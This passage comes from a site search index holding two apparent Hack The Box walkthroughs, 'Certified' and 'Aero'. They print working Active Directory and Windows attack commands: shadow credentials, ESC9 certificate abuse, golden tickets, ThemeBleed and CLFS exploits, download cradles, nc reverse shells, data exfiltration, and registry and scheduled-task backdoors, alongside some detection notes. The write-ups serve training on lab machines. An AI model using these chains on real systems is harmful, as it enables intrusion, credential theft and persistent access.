we will modify the rights to allow ourselves to add user Once we are owner we will then need to modify our rights to be able to add users to the group. Third we will add ourselves to the group \u0026ldquo;Management\u0026rdquo;: Fourth we will perform shadow credentials attack on \u0026ldquo;MANAGEMENT_SVC\u0026rdquo;: We can then perform a shadow credentials attack to add certificate based credentials to the user \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; and then authenticate as them and request a kerberos ticket which we can then pass to be used as authentication. We can do this as we will now be part of the \u0026ldquo;Management\u0026rdquo; group and in turn have GenericWrite over the \u0026ldquo;MANAGEMENT_SVC\u0026rdquo; object. +Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector: https://bloodstiller.com/articles/shadowcredentialsattack/ Making Judith owner of the Management group \u0026amp; then adding her as a user: +Note+: For some reason impacket is displaying lots of errors but we can ignore them as it\u0026rsquo;s still completing the tasks. I\u0026rsquo;ve included them here in-case you also get them.\nMake judith the new owner of management:\nimpacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass Grant Judith the ability to add users to the group by modifying the DACL\u0026rsquo;s:\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass Add judith to the group:\nnet rpc group addmem \u0026quot;Management\u0026quot; $user -U $domain/$user%$pass -S $box +Note+: There will be no output from this command, we need to instead verify it worked in the next command. Verify Judith is now part of the group:\nnet rpc group members \u0026quot;Management\u0026quot; -U $domain/$user%$pass -S $box Performing the shadow credentials attack against \u0026ldquo;MANAGEMENT_SVC\u0026rdquo;: Setting up pywhisker: As we are performing this from a linux host we need to use the python based version of whisker: https://github.com/ShutdownRepo/pywhisker git clone https://github.com/ShutdownRepo/pywhisker.git Lets create a venv so it does not mess with our base python installation:\n#Navigate into the repo: cd pywhisker #Create the venv: python -m venv whisker #Activate the venv: source whisker/bin/activate #Install our dependencies in the venv: pip install -r requirements.txt I try to run it but get the below error:\npython3 pywhisker.py -d $domain -u $user -p $pass --target \u0026quot;MANAGEMENT_SVC\u0026quot; --action \u0026quot;add\u0026quot; --filename newCert --export PEM Looking online leads me to this open issue: https://github.com/ShutdownRepo/pywhisker/issues/21 It appears to not run from a venv currently due to the way imports are handled. So we will need to check out a previous git branch. Finding a previous pywhisker commit prior to breaking changes and using that: Click \u0026ldquo;Commits\u0026rdquo;:\nFind the commmit we want:\nClick on it. Grab the full commit hash:\nCheck it out:\ngit checkout -f ec30ba5759d57ead54341f58289090a9dc01249a I found the commit that was before the breaking changes to envs:\ngit checkout -f ec30ba5759d57ead54341f58289090a9dc01249a Using pywhisker to perform our shadow credentials attack: I run pywhisker and it works:\npython3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -p $pass --target \u0026quot;MANAGEMENT_SVC\u0026quot; --action \u0026quot;add\u0026quot; --filename newCert --export PEM We get our newCert_cert.pem \u0026amp; our newCert_priv.pem which we will use next +Note+: If this fails and you get the below error then you should follow the steps of granting Judith the ability to add users to groups and the subsequent steps. I believe there is some sort of cleanup rule in place which cleans up ACL\u0026rsquo;s. Looking at pywhiskers readme it says:\nOnce the values are generated and added by pyWhisker, a TGT can be request with gettgtpkinit.py The NT hash can then be recovered with getnthash.py.\nInstalling PKINIT: Clone repo:\ngit clone https://github.com/dirkjanm/PKINITtools.git Setup venv:\n#Navigate into the repo: cd pkinit #Create the venv: python -m venv pk #Activate the venv: source pk/bin/activate #Install our dependencies in the venv: pip install -r requirements.txt Requesting a TGT for MANAGEMENT_SVC with PKINITtools getgtgkinit: Request TGT \u0026amp; export as .ccache by using our newCert_cert.pem \u0026amp; newCert_priv.pem:\npython3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem newCert_cert.pem -key-pem newCert_priv.pem $domain/MANAGEMENT_SVC MANAGEMENT_SVC.ccache We can see our .ccache: Next we will load the ccache into our KRB5CCNAME variable as we will need this for next step:\nexport KRB5CCNAME=./MANAGEMENT_SVC.ccache Requesting the MANAGEMENT_SVC user hash with PKINITtools getnthash: Extract the NTHash for the MANAGEMENT_SVC user:\npython3 /home/kali/windowsTools/PKINITtools/getnthash.py -key d03e77aab1235a85021ef9936275dd2e4df05d027c381d33695338dcb0772389 $domain/MANAGEMENT_SVC Hash retrieved for MANAGEMENT_SVC account. Lets verify the hash works:\nnetexec smb $box -u $user -H $hash It does. I try and crack the hash using hashcat but it wont\u0026rsquo; crack.\nLogging in as MANAGEMENT_SVC: Login using evil-winrm:\nevil-winrm -i $box -u $user -H $hash Grab our user.txt flag:\n3. Lateral Movement: Discovering that MANAGEMENT_SVC has GenericAll over CA_OPERATOR: Looking back in bloodhound I see we have GenericAll privileges over \u0026ldquo;CA_OPERATOR\u0026rdquo; which means we can actually just perform another shadow credentials attack: Performing the shadow credentials attack against \u0026ldquo;CA_OPERATOR\u0026rdquo; Lets perform our shadow credentiasl attack using pyhisker again: python3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -H :$hash --target \u0026quot;CA_OPERATOR\u0026quot; --action \u0026quot;add\u0026quot; --filename CACert --export PEM +Note+: I have set the user=MANAGEMENT_SVC in my variables and have exported the extracted hash also. Requesting a TGT for CA_OPERATOR with PKINITtools getgtgkinit: Now we perform the same process again to be able to extract their hash by using the .pem files we have retrieved to export a .ccache we can authenticate with:\npython3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/CA_OPERATOR CA_OPERATOR.ccache We load the ccache into our KRB5CCNAME variable:\nexport KRB5CCNAME=./CA_OPERATOR.ccache Requesting the CA_OPERATOR user hash with PKINITtools getnthash: Now we extract the NTHash:\npython3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 4c6a721a5bbe0a510df5e45f62e579a161cd734466eeaab9586c2466ea815945 $domain/CA_OPERATOR Hash retrieved for CA_OPERATOR account. Lets verify the hash works:\nnetexec smb $box -u $user -H $hash It does. I try and crack the hash using hashcat but it wont\u0026rsquo; crack either\n4. Privilege Escalation: Discovering that we can perform the ESC9 exploit chain CA vulnerability as CA_OPERATOR: I re-run certipy-ad as the \u0026ldquo;CA_OPERATOR\u0026rdquo; user:\ncertipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box It appears that we can follow the ESC9 attack chain as this user. There is only 1 certificate template: CertifiedAuthentication which will be the vulnerable one. Looking at the certipy repo we see the following:\nhttps://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10 Blog Post Mentioned ESC9 Privilege Escalation: Reading the blog post we can see the following requirements are needed: +Requirements for the attack+: GenericWrite over any account (A) to compromise any account (B): As we have GenericAll (which includes GenericWrite) over the ca_operator from the management_svc account we can perform this action. The NT Hash of Account (A) We have already extracted this the ca_operator hash in our previous shadow credentials attack Changing the UPN of the ca_operator to be administrator: Change the userPrincipalName of ca_operator to be Administrator. certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn Administrator +Note+: We\u0026rsquo;re omitting the domain for ca_operator to make actions appear as if they’re performed by Administrator. This reassigns the identity so that future actions will appear as if ca_operator is the Administrator. Requesting our vulnerable cert using as the ca_operator: We request the vulnerable certificate template CertifiedAuthentication We must request the certificate as ca_operator: certipy-ad req -username ca_operator.$domain -hashes :$caHash -ca certified-DC01-CA -template CertifiedAuthentication +Note+: The userPrincipalName in the certificate is Administrator since we changed the UPN and omitted ca_operator\u0026rsquo;s domain in step 1, resulting in a certificate without the original ca_operator SID. +Why+: Changing the UPN lets us request a certificate with the Administrator\u0026rsquo;s UPN, granting elevated privileges without linking to the original ca_operator SID. Reverting the ca_operator\u0026rsquo;s UPN: Now we change back the userPrincipalName of ca_operator to the original userPrincipalName ca_operator@CERTIFIED.HTB: certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn ca_operator@$domain +Why+: This avoids detection by reverting ca_operator to its default identity. Authenticating with the certificate to retrieve the NT hash of the administrator: Now we authenticate with the certificate, to receive the NT hash of the Administrator user:\ncertipy-ad auth -pfx administrator.pfx -domain $domain Hash retrieved. +Note+: We add -domain to the command because the certificate is set to administrator without a domain specified. Verify the hash works:\nevil-winrm -i $box -u $user -H $hash Grab our root flag:\n5. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -H $hash -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Run Klist:\nklist +Note+: We can see our ticket lasts for 10 years. If we look at our previous ticket, it only lasted 24 hours: Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Revoked which means there is some form of protection/mitigation in place. Instead of going down this path lets look at another solution. Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host every 1 minute: I will create a powershell script and use a download cradle to call back to my attack host, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry) so it will be harder to detect.\nCreate our reverse-shell script:\nI use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using https://revshells.com for this We then need to create our scheduled task:\nschtasks /create /tn LetMeIn /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.21:9000/script.ps1'''))'\u0026quot; /sc minute /mo 1 /ru System +Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Start our listener \u0026amp; webserver:\nWebserver: python3 -m http.server [port] Listener: rlwrap -cAr nc -nvlp 53 The task grabs our script \u0026amp; immediatley executes it in memory:\nWe get our revere shell:\nDouble check by disconnecting \u0026amp; seeing if it re-connects:\nIt does: Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown: schtasks /create Creates a new scheduled task on Windows. /tn LetMeIn Sets the task name to LetMeIn. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Specifies the action that the task will execute. powershell.exe: Starts PowerShell. Arguments passed to powershell: -WindowStyle hidden: Runs the task in a hidden window to prevent showing the PowerShell window. NoLogo -NonInteractive -ep bypass -nop: PowerShell flags to suppress output and allow script execution bypassing restrictions. IEX ((New-Object Net.WebClient).DownloadString(...)): Uses Invoke-Expression to download and immediately execute the script. /sc minute /mo 1: Sets the task to run every 1 minute. /ru System: Runs the task under System privileges. Lessons Learned: What did I learn? I learned alot more about shadow-credential attacks and CA attacks.\nI really enjoyed the process of how layered and different the attack chain was for this compared to other boxes I have done.\nWhat silly mistakes did I make? Not so many, getting better\u0026hellip;.I hope Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/certified-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/dacls\/": {
        "title": "DACLS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/dacls\/"
    },
    
    "http:\/\/localhost:1313\/tags\/esc9\/": {
        "title": "ESC9",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/esc9\/"
    },
    
    "http:\/\/localhost:1313\/tags\/medium\/": {
        "title": "Medium",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/medium\/"
    },
    
    "http:\/\/localhost:1313\/tags\/msds-keycredentiallink\/": {
        "title": "MsDS-KeyCredentialLink",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/msds-keycredentiallink\/"
    },
    
    "http:\/\/localhost:1313\/tags\/whisker\/": {
        "title": "Whisker",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/whisker\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/aero-box\/": {
        "title": "Aero HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","Active Directory","CVE-2023-38146","ThemeBleed","CVE-2023-28252","Persistence",],
        "content": "Aero Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Aero How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\nnmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:23:39 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:23 GMT Nmap scan report for 10.129.229.128 Host is up (0.036s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds Initial thoughts: Well looks like we are checking out the webserver…. Basic UDP Scan:\nsudo nmap $box -sU -Pn -oA UDPbasicScan kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:23:55 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:24 GMT Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 56.00% done; ETC: 08:27 (0:01:29 remaining) Nmap scan report for 10.129.229.128 Host is up. All 1000 scanned ports on 10.129.229.128 are in ignored states. Not shown: 1000 open|filtered udp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 201.42 seconds Initial thoughts: Nothing additional being run on the UDP side. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 3m25s 🕙 08:27:36 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:30 GMT Nmap scan report for 10.129.229.128 Host is up (0.040s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Aero Theme Hub Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 11 (88%) Aggressive OS guesses: Microsoft Windows 11 21H2 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 175.09 seconds Findings: Nothing further which means we will be leveraging a web based attack. Web 80: Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic We can see there is an upload dir which is interesting, as this means we can most likely upload something. Running whatweb I run whatweb for further enumeration however it doesn\u0026rsquo;t tell us anything additional. We knew it was IIS from our nmap scan. kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 4GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 2m55s 🕙 08:33:15 zsh ❯ whatweb $box http://10.129.229.128 [200 OK] Bootstrap, Cookies[.AspNetCore.Antiforgery.SV5HtsIgkxc], Country[RESERVED][ZZ], Email[support@aerohub.htb], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.AspNetCore.Antiforgery.SV5HtsIgkxc], IP[10.129.229.128], Microsoft-IIS[10.0], Script, Title[Aero Theme Hub], X-Frame-Options[SAMEORIGIN], X-Powered-By[ARR/3.0] Web-site Enumeration: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Discovering the upload portal: Looking at the page it appears to be a single page site dedicated to windows 11 themes:\nWe find the upload portal straight away:\nAs we can see it\u0026rsquo;s looking for us to upload a windows theme. We can see it\u0026rsquo;s looking for \u0026ldquo;Custom Files\u0026rdquo;:\nI have a jpg in this folder currently as I wanted to see if it would allow any other sort of file extensions to be uploaded. I do some investigating and find this page about .theme files:\nI add the extension .theme to a jpg and it\u0026rsquo;s now visible when searching for a file to upload \u0026amp; it appears as expected. Discovering ThemeBleed CVE-2023-38146 exploit: After some searching online I find that there is a known exploit for windows 11 themes called ThemeBleed: 2. Foothold: I find a POC here for the ThemeBleed exploit: https://github.com/Jnnshschl/CVE-2023-38146 The creator has also written a blog-post to accompany the POC. +Deep Dive+: I have written a deep dive on this particular exploit you can find it here: https://bloodstiller.com/articles/understandingthemebleedcve-2023-38146/ Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: Reading the blog post we can see we need to create a reverse shell dll which will then be used as part of the exploit. Luckily the author has created a POC for this also:\nhttps://github.com/Jnnshschl/ThemeBleedReverseShellDLL Let\u0026rsquo;s spin up a windows VM to build this:\nI prefer to use a Windows 10 VM customized with the Mandiant Commando script You will also require Visual Studio to compile this (+not Visual Studio Code+ ), so if you don\u0026rsquo;t have this you will need to install it . Setup the project:\nOpen visual studio Clone the repo Put our attack IP in the relevant pat:\nOn the right hand side find the main.cpp file ans scroll down to lines 32/34 We enter our Attack Machines IP \u0026amp; Port number we want to listen on. Ensure \u0026ldquo;autoReconnect\u0026rdquo; is set to false Set to release per instructions:\nBuild the solution:\n+Note+: Building the solution is just a way to saying \u0026ldquo;Compile the exploit\u0026rdquo; The file should be located in:\nC:\\Users\\[YourUserName]\\source\\repos\\ThemeBleedReverseShellDLL\\x64\\Release\\ThemeBleeedReverseShell.dll Running the ThemeBleed Exploit to get a reverse shell: Switching back to the main repo, we clone that:\ngit clone https://github.com/Jnnshschl/CVE-2023-38146.git Moving the compiled reverse shell to the relevant folder:\nReading the instructions we need to move the compiled ThemeBleeedReverseShell.dll file to the tb folder in the main repo \u0026amp; rename it to Aero.msstyles_vrf_evil.dll +Note+: On the repo it says to move it to td but it\u0026rsquo;s actually called tb Next I start my nc listner:\nrlwrap -cAr nc -nvlp 4711 Trigger the exploit:\npython3 themebleed.py -r [MYAttackMachine] --no-dll It connects and we get our revers shell:\nAs we can see it also appears to dump the hash for sam.emerson and connects as them I tried to crack this with rockyou.txt but no hits. Enumerating as sam.emerson: Get the user flag:\nLooking in documents we find a CVE-2023-28252 pdf and a file called watchdog.ps1\nWhat looks interesting is the CVE-2023-28252_Summary.pdf lets grab that. +Note+: I checked out the watchdog.ps1 script but it\u0026rsquo;s just how the box works by checking for uploaded themes periodically (every 15 seconds) Exfiltrating the CVE-2023-28252_Summary.pdf using base64 encoding: As we only have 1 connection and no evil-winrm etc we have to live off the land. Luckily we can easily exfiltrate this using PowerShell \u0026amp; base64 encoding.\n+Note+: I actually have a custom webserver called bloodserver which would be perfect for this but I wanted to challenge myself to live off the land as much as possible with this box so stuck to using inbuilt windows functionality where possible. Lets base64 encode the pdf and assign to the variable $b64:\n$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Users\\sam.emerson\\Documents\\CVE-2023-28252_Summary.pdf' -Encoding Byte)) Setup our listner:\nnc -nvlp 9999 Send the base64 encoded pdf to our attack host:\nInvoke-WebRequest -Uri http://10.10.14.121:9999/ -Method POST -Body $b64 Received on listner:\nDecode the base64 encoded string:\necho \u0026quot;[bas64encodedpdf]\u0026quot; | base64 -d -w 0 \u0026gt; CVE-2023-28252_Summary.pdf Reading the PDF goes more in depth about CVE-2023-28252:\n3. Privilege Escalation: Researching CVE-2023-28252 (CLFS) Vulnerability: So as it looks like this host is vulnerable to this specific exploit (well its implied) lets find a POC.\nAfter some looking online I find various exploits however this one is actually pre-compiled and can save us some time.\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe +Note+: Looking at the notes it also allows us to pass another binary as an argument to be executed. This is ideal as if we can run a process/binary with elevated privileges we can get a reverse shell as NT/Authority +Deep Dive+: I have written a deep dive on this particular exploit you can find it here:\nhttps://bloodstiller.com/articles/understanding2023-28252-clfs/ I clone exploit:\ngit clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git Transfer the exploit to the target:\nwget http://10.10.14.121:9000/exploit.exe -o ex.exe As this exploit allows us to execute a binary as an argument lets transfer n64.exe to the target too:\nwget http://10.10.14.121:9000/nc64.exe -o nc64.exe Lets start our listener for our reverse-shell:\nrlwrap -cAr nc -nvlp 443 I trigger exploit and pass n64.exe as an argument:\n.\\ex.exe 1208 1 \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 443 -e cmd\u0026quot; High level Command Breakdown: .\\ex.exe: The compiled exploit executable 1208: Process ID to target 1: Execution mode flag Netcat parameters: 10.10.14.121: Our attack IP address 443: Port to connect back to -e cmd: Execute cmd.exe and bind it to the connection Catch NT/Authority system shell:\nGrab root flag:\n4. Persistence: Trying to dump creds with mimikatz: I try and Transfer mimikatz but it gets caught by amsi I try multiple different ways however it\u0026rsquo;s caught each time, luckily there are versions of mimikatz we can from memory: Using invoke-mimikatz.ps1 with a download cradle to dump hashes: Use a download cradle to grab the script: iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1') Perform LSADUMP: Invoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::sam\u0026quot;' +Note+: With this information we can make a kerberos silver ticket; however we have no way to actually authenticate with the host once it\u0026rsquo;s made as nothing is open…so we will need to look at other solutions. Download Cradle Primer: We are going to be using a download cradle later, so it\u0026rsquo;s probably best you understand how they work. What is a Download Cradle? In essence, a download cradle is a lightweight script or command that reaches out to the internet/host, downloads a file, and often executes it directly in memory. And that is why they work so well, as nothing is written to disk and instead runs in memory they are harder to detect:\nIf we look at the invoke-mimikatz.ps1 script we called: iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1') This reaches out to a remote URL (our attack hosts), download\u0026rsquo;s the payload, and execute \u0026amp; loads it into memory all in one go. (later on you will see me use this again but instead to create a reverse shell that is called upon loading into memory) How Do Attackers Use Download Cradles: There are multiple ways to leverage download cradles in various stages of an attack. The most common is often during initial access or lateral movement phases. Here are some common scenarios:\nDelivering Malware: By downloading and running malware directly in memory, it is possible to bypass traditional file-based antivirus. This is often done by ransomware gangs. Moving Through a Network: In the above case we can use cradles to download tools for privilege escalation or credential theft as we navigate a compromised network/machine. Running Exploits: Tools like Metasploit use download cradles to quickly deliver payloads that exploit vulnerabilities and gain control over systems. Why Download Cradles are Effective: They are a great attack approach as they are: Stealthy: As they work without writing to disk, they leave less evidence for traditional detection tools. Compact: Cradles can be as short as a single line of code (as you can see with invoke-mimikatz), making them hard to spot amid legitimate scripts. Flexible: They can be adjusted and modified allowing what is being downloaded to be executed in real-time, adapting to the environment. Detecting and Stopping Download Cradles: While they’re sneaky, download cradles can be detected with the right strategies:\nNetwork Monitoring: Watching for suspicious connections or repeated download attempts from unusual sources can reveal download cradle activity. Script Restrictions: Limit the use of PowerShell, Curl, or Wget in environments where they aren’t essential. PowerShell, for instance, can be configured to block the Invoke-WebRequest command or require execution approval. EDR Solutions: Endpoint Detection and Response (EDR) tools can help track process execution and identify cradle behaviors based on known patterns and heuristics. Creating a new user who is part of the administrators group: As we are an administrator we can also add a new user and add them to the administrators group.\nI add a new user as part of the administrators group:\nnet user bloodstiller bl00dst1ll3r! /add net localgroup Administrators bloodstiller /add +Note+: I am doing this purely as a mechanism to showcase different ways to establish persistence, however as you have probably noticed there is no way to actually login as this user, the same way as there would be no way to use the Administrators Silver ticket if we made it, so what do we do, glad you asked. Living off the land persistence: As this system only has the webserver running there are no other services we can authenticate against as a means of persistence. Creating silver tickets and adding admin users is great but if we cannot actually utilize those accounts \u0026amp; tickets what can we do? We need to have the host call out to us, by creating a backdoor, or multiple back-doors. Creating a registry key for a back-door: The first backdoor I will create is to create an entry in the registry that runs on login, so that when a user logs in it will call out to my attack machine which has a listener running. Registry Key added: Reg add \u0026quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026quot; /v NewBackDoor /t REG_SZ /d \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; This will trigger when a user logs in, however as we have no way to test this or login as a normal user, we will need to also have another way in. Registry Backdoor Command Breakdown: Command Breakdown:\nReg add\nAdds or modifies a registry key or value. \u0026quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026quot;\nSpecifies the registry path. The Run key allows programs to run automatically when the user logs in. /v NewBackDoor\nSpecifies the name of the registry value being added, here NewBackDoor. Acts as the identifier for this specific entry. /t REG_SZ\nDefines the type of the registry value. REG_SZ is a string value type commonly used for paths or commands. /d \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot;\nSets the data for the registry value. Path: \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe\u0026quot; Path to nc64.exe (likely Netcat), used to open a reverse shell. IP Address*: 10.10.14.121 Our attack machine that is listening where the reverse shell will connect. Port: 4433 The port number on our attack machine listening for the connection. Flag: -e cmd The -e flag executes cmd.exe upon connection, providing a command shell. Potential Defenses/Mitigation\u0026rsquo;s:\nMonitoring: Detect unusual registry changes in HKEY_CURRENT_USER\\...\\Run. Network Monitoring: Watch for unusual outgoing connections to external IPs and ports. Creating a scheduled task back-door: A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I\u0026rsquo;ve put two approaches below. Version 1: Using nc64.exe to connect back to our attack host periodically: Scheduled Task Backdoor: schtasks /create /tn BackDoor /tr \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; /sc minute /mo 1 /ru System +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host: Shell Caught: Just to double check I disconnect to ensure it calls back out to me: Scheduled Task Backdoor Command Breakdown Running a Binary:\nCommand Breakdown:\nschtasks /create Creates a new scheduled task on Windows. /tn BackDoor Sets the task name to BackDoor. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; Specifies the action that the task will execute. Path: \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe\u0026quot; Path to nc64.exe, used to open a reverse shell. IP Address*: 10.10.14.121 Our attack machine that is listening where the reverse shell will connect. Port: 4433 The port number on our attack machine listening for the connection. Flag: -e cmd The -e flag executes cmd.exe upon connection, providing a command shell. /sc minute Sets the task\u0026rsquo;s schedule frequency to every minute. /mo 1 Modifier that, when used with /sc minute, runs the task every 1 minute. /ru System Specifies that the task should run with System privileges. Running as System grants high privileges, making this backdoor more dangerous. Potential Defenses/Mitigation\u0026rsquo;s:\nMonitor Scheduled Tasks: Regularly check for unauthorized or unusual tasks, especially those scheduled to run frequently or with System privileges. Network Monitoring: Identify repeated outgoing connections to unknown IPs and ports, especially if made by nc64.exe or similar executables. Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host: So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)\nCreate our reverse-shell script:\nI use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using https://revshells.com for this We then need to create our scheduled task:\nschtasks /create /tn ScriptCradle /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.121:8080/script.ps1'''))'\u0026quot; /sc minute /mo 1 /ru System Start our listener \u0026amp; webserver:\nWebserver: python3 -m http.server [port] Listener: rlwrap -cAr nc -nvlp 53 The task grabs our script \u0026amp; immediatley executes it in memory:\nWe get our revere shell:\nDouble check by disconnecting \u0026amp; seeing if it re-connects and it does:\nScheduled Task Backdoor Utilizing Download Cradle Command Breakdown:\nschtasks /create Creates a new scheduled task on Windows. /tn ScriptCradle Sets the task name to ScriptCradle. This name is how the task will appear in the Task Scheduler. /tr 